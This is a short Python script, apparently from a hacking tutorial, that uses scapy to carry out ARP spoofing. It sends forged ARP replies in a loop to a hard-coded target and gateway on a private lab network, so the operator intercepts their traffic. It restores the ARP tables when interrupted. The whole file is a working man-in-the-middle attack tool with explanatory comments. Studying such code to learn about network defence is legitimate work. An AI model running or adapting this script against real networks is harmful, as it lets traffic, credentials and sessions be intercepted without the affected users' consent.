# !usr/bin/env python
import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)                           #create a ARP request
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")           #create ether frame and set the broadcast MAC
    arp_request_broadcast = broadcast/arp_request              #combine ARP request and ether frame

    ans, unans = scapy.srp(arp_request_broadcast, timeout=1)   #used to send and recieve packets

    mac = ans[0][1].hwsrc
    return mac

'''
    takes target IP and Spoof IP as arguments and send a ARP response to the victim
    first parameter is the target device
    second parameter is the spoofing device(which we want to fake)
    this function modifies the ARP table of the target device with the operating device's MAC
    address
'''
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)                                             #needed to send the ARP response to the target device
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)   #op 2 is a response
    scapy.send(packet, verbose=False)

'''
    restores the ARP tables
'''

def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)                                  #send the response 4 times to make sure it changes

# restore("192.168.42.133", "192.168.42.2")
gateway_ip = "192.168.42.2"
target_ip = "192.168.42.133"

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] Packets Sent: " + str(sent_packets_count))
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Keyboard Interrupt detected : exiting")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)

